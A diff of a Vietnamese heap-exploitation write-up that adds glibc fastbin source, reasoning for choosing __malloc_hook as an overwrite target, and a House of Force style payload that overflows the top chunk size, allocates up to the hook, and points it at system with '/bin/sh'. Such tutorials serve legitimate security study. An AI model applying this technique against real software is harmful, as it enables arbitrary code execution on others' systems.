@@ -10,8 +10,37 @@ Trong bài viết này, mình sẽ giải thích những vấn đề bao gồm:
 
 - Nếu như chúng ta đã có 1 primitive mạnh, ta nên ghi đè giá trị quan trọng nào để `drop the shell`?
 
-### Fastbins(2.28) check những gì?
-
+### Fastbins(2.28-no-tcache) check những gì?
+```
+ if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
+    {
+      idx = fastbin_index (nb);
+      mfastbinptr *fb = &fastbin (av, idx);
+      mchunkptr pp = *fb;
+      do
+        {
+          victim = pp;
+          if (victim == NULL)
+            break;
+        }
+      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
+             != victim);
+      if (victim != 0)
+        {
+          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+            {
+              errstr = "malloc(): memory corruption (fast)";
+            errout:
+              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
+              return NULL;
+            }
+          check_remalloced_chunk (av, victim, nb);
+          void *p = chunk2mem (victim);
+          alloc_perturb (p, bytes);
+          return p;
+        }
+    }
+```
 
 
 ### Bug Class - Heap OverFlow
@@ -101,30 +130,32 @@ malloc(24, b"Much win")
 ```
 ### Exploitation
 
+- Vậy làm sao để ta có thể sử dụng cái primitive này để khai thác chương trình?
 
+=> Ta phải dùng primitive này để ghi đè vào 1 địa chỉ quan trọng trong chương trình từ đó, thay đổi CFG theo ý chúng ta, tuy vậy, ta nên ghi đè vào giá trị nào?
 
+- Ta có thể ghi đè vào các địa chỉ quan trọng ở stack, và ta nghĩ ngay tới retaddr hoặc là *fp, nhưng vì stack thuộc aslr region và ta không thể leak, nên ta sẽ loại trừ phương án stack.
 
+- Chúng ta cũng có thể target các địa chỉ ở binary, khi nghĩ tới `code execute`, ta sẽ nghĩ tới ghi đè các entry trong `plt` thông qua lazy binding, cũng là 1 cách hay để điều khiển luồng chương trình. Hoặc là ta có thể ghi đè `__fini_array`, vốn là 1 mảng gồm các con trỏ hàm. Mỗi hàm trong `__fini_array` sẽ được gọi khi chương trình thoát, nên ta có thể ép chương trình thoát để chiếm luồng thực thi. Tuy nhiên, vì RELRO được bật `full` nên những vùng này sẽ là `r-only` , nên ta sẽ loại trừ phương án này.
 
+- Ta có thể target `heap`, tuy vậy, vì `heap` không chứa con trỏ hay dữ liệu nhạy cảm gì cả,... nên ta cũng sẽ bỏ qua hướng này.
 
+- Ta có libc leak, nên ta có thể access vào những địa chỉ quan trọng của libc, hai thứ ta nghĩ ngay đầu tiên là `__exit_funcs` và `tls_dtors`, là 1 danh sách hàm cleanup sẽ được gọi khi thoát chương trình, tuy nhiên, vì Pointer Guard, nên các địa chỉ này là không ổn định/bị xáo trộn qua mỗi lần, nên ta sẽ loại hướng này.
 
+- Tuy vậy, ta vẫn có thể target được 1 mục tiêu rất đặc thù của allocator, đó là `__malloc_hook`(là một fp*, nên thường được ưu tiên trong exploitation) và vì ta có libc leak, nên ta có thể biết được địa chỉ của `__malloc_hook`. Từ đó, ghi đè vào đó 1 lệnh nguy hiểm như `system`, khi lần tới malloc được gọi, nó sẽ gọi hook và vì nó là 1 fp*, nó sẽ thực thi lệnh của ta đã chuẩn bị sẵn.
 
+- Vậy giờ hướng đi đã rõ, trước hết, ta sẽ `malloc(24, b"Y"*24 + p64(0xffffffffffffffff))` để ghi đè top chunk thành 1 giá trị cực lớn.
 
+- sau đó, ta `malloc` để thu hẹp khoảng cách từ chunk tiếp theo(là top chunk) đến địa chỉ cần ghi đè trừ cho 0x20, để lần sau `malloc(0x20, data)` sẽ ghi đè `__malloc_hook`
 
-
-
-
-
-
-
-
-
+- Tiếp đó, ta ghi đè hook với `system`. Vì vậy, lần tới ta gọi `__malloc_hook` thì nó sẽ gọi `system()` và vì đây là 1 fp*, nên nó sẽ nhận tham số của hook, ta sẽ truyền địa chỉ của chuỗi "/bin/sh" trong libc.
 
 payload cuối cùng:
 
 ```python
 # Request a chunk; overflow its user data and overwrite the top chunk's size field with a large value.
 # Write a "/bin/sh" string here if not using the one in libc.
-malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))
+malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xffffffffffffffff))
 
 # Make a very large request that spans the gap between the top chunk and the malloc hook.
 # Target the malloc hook because the designer can't explicitly call free().
